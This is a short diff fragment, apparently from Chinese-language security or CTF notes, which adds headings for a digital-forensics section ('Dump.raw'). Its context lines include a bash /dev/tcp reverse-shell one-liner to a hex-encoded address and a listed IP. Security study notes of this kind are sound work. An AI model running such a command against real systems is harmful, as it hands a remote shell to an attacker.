@@ -51,3 +51,7 @@ foreach($data_array as $sql_str) {
 反弹shell
 `bash -c "bash i >& /dev/tcp/0x1d205d4/12450 0>&1"`
 IP:1.210.5.212
+
+
+# 数字调查取证
+## Dump.raw
